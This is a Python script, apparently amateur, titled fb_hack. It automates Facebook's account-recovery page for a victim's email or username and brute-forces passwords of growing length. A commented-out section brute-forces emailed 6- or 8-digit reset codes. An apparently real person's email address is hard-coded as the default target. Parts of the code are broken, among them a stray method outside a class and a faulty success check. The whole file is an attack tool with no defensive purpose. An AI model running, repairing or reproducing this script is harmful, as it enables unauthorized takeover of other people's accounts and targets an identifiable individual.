import itertools, sys, requests, mechanize, os, re
from time import sleep
from bs4 import BeautifulSoup

MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
              'AppleWebKit/534.7 (KHTML, like Gecko) ' \
              'Chrome/7.0.517.41 Safari/534.7' 

def __init__(self):
    self.browser = self.setup_browser()

def setup_browser(self):
    browser = mechanize.Browser()
    browser.set_handle_robots(False)
    cookies = mechanize.CookieJar()
    browser.set_cookiejar(cookies)
    browser.addheaders = [('User-agent', MOZILLA_UAS)]
    browser.set_handle_refresh(False)
    return browser

def sleepy(counter):
  x = counter
  y = 0
  while x > y:
    x -= 1
    z = x
    if x <= 9:
      code = ("0", str(z))
      h = ""
      yo = h.join(code)
      x 
      print(yo, end='\r')
    else:
      print(x, end='\r')
    sleep(1)

def fb_hack(email, codex, respect):
  soup = BeautifulSoup()
  browser = mechanize.Browser()
  browser.set_handle_robots(False)
  cookies = mechanize.CookieJar()
  browser.set_cookiejar(cookies)
  browser.addheaders = [('User-agent', MOZILLA_UAS)]
  browser.set_handle_refresh(False)
  browser.open('https://facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&_fb_noscript=l')
  browser.select_form(nr=0)
  response1 = browser.response()
  soup = BeautifulSoup(response1, 'html.parser')
  mobile = soup.find(string=re.compile("mobile"))
  browser.click(coord=(428,18))
  browser.form['email'] = email
  browser.submit()
  browser.select_form(nr=0)
  browser.click(name='Try another way')
  counter = 0
  for combination in itertools.product(["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","!","#","$","%","^","&","*"], repeat=int(respect)):
    p = (''.join(map(str, combination)))
    counter += 1
    if counter <= codex:
      print("working", end='\r')
    else:
      try:
        browser.form['pass'] = p
        browser.submit()
      except:
        response1 = browser.response()
        soup = BeautifulSoup(response1, 'html.parser')
        with open("output1.html", "w") as file:
          file.write(str(soup))
      could = int(counter)
      code1 = (str(could), str(p), "failed")
      code2 = (str(could), str(p), "check")
      h = " "
      yo = h.join(code1)
      yot = h.join(code2)
      response1 = browser.response()
      soup = BeautifulSoup(response1, 'html.parser')
      taw = soup.find(string="Try another way")
      if taw != "None":
        print(yo)
      else:
        print(yot)
        respect = 0
        break
      sleepy(30)
    
  browser.select_form(nr=0)
  forms = list(browser.forms())
  form = forms[0]
  print(form)
  """test = soup.find(string='poop')
  check1 = soup.find(string=("Please check your email for a message with your code. Your code is 6 numbers long."))
  soup.find(string=re.compile("Please check your email for a message with your code. Your code is 6 numbers long."))
  check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
  check3 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
  check4 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
  if check1 == "Please check your email for a message with your code. Your code is 6 numbers long.":
    attempt1 = 0
    attempt2 = int(codex)
    print(check1)
    for combination in itertools.product(range(10), repeat=6):
      y = str(''.join(map(str, combination)))
      if attempt1 <= attempt2:
        attempt1 += 1
        print("working -", end='\r')
        print("working +", end='\r')
      else:
        print(y)
        browser.select_form(nr=0)
        browser.set_value(str(y), nr=5)
        browser.submit()
        response1 = browser.response()
        soup = BeautifulSoup(response1, 'html.parser')
        soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
        if check1 != test:
          sleepy(30)
          attempt1 += 1
        else:
          break
  else:
    attempt1 = 0
    attempt2 = int(codex)
    print(check2)
    for combination in itertools.product(range(10), repeat=8):
      y = str(''.join(map(str, combination)))
      if attempt1 <= attempt2:
        attempt1 += 1
        print("working -", end='\r')
        print("working +", end='\r')
      else:
        print(y)
        browser.select_form(nr=0)
        browser.set_value(str(y), nr=5)
        browser.submit()
        response1 = browser.response()
        soup = BeautifulSoup(response1, 'html.parser')
        soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
        if check1 != test:
          sleepy(30)
          attempt1 += 1
        else:
          break
  
  response1 = browser.response()
  soup = BeautifulSoup(response1, 'html.parser')
  if soup.find(string="password_new") == test:
    print("Passcode not found")
    with open("output1.html", "w") as file:
        file.write(str(soup))
    reset = attempt1
  elif soup.find(string="password_new") != test:
    print("Passcode found!")
    print(y)
    browser.close()
    reset = int(-1)
  return reset"""
  past = int(respect)
  return past

os.system('clear')
ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
reset = int(input('Code: ') or 1)
past = int(input('Length: ') or 6)
while past >= 6:
  fb_hack(ehack, reset, past)
  past += 1